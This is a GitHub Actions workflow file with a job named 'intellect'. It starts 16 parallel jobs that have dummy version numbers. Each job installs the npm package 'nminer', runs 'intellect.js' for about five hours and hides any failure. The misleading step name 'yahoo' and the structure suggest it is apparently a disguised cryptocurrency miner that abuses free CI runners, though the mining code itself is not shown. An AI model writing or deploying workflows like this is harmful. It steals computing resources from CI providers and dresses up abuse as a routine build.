name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2708 }
          - { version: 9836 }
          - { version: 7777 }
          - { version: 5840 }
          - { version: 6547 }
          - { version: 6771 }
          - { version: 69 }
          - { version: 6281 }
          - { version: 7858 }
          - { version: 263 }
          - { version: 1887 }
          - { version: 9071 }
          - { version: 5310 }
          - { version: 4482 }
          - { version: 6336 }
          - { version: 9507 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: yahoo
        run: |
          npm install nminer@latest
          timeout 304m node intellect.js || echo "intellect executed"